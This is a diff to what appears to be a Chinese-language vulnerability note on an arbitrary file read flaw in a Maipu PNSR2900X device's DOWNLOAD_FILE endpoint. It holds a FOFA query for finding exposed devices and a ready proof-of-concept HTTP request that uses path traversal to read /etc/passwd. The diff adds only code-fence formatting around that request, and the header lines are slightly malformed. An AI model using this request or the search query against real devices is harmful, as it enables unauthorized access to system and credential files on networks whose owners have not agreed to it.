@@ -79,11 +79,15 @@ FOFA：body="/assets/css/ui-dialog.css"&& body="/form/formUserLogin"
 
 POC/EXP：
 
+
+```http
 GET /DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 Connection: keep-alive
+```
+
 
 ![image-20241015173223797](./.resource/迈普pnsr2900xDOWNLOAD_FILE任意文件读取漏洞/media/image-20241015173223797.png)
 
